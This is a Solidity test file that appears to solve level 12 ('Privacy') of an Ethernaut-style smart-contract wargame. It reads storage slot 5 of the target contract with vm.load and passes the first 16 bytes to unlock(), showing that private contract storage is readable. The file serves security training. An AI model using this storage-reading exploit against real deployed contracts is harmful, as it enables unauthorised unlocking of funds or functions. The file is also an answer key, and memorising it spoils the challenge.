// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {PrivacyFactory} from "../src/levels/12-PrivacyFactory.sol";
import {Privacy} from "../src/levels/12-Privacy.sol";

contract PrivacySolution is BaseTest {

    function solution(address payable target_) internal override{
        Privacy target = Privacy(target_);
        bytes32 keyWord = vm.load(address(target), bytes32(uint256(5)));
        target.unlock(bytes16(keyWord));
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new PrivacyFactory()));
    }
}
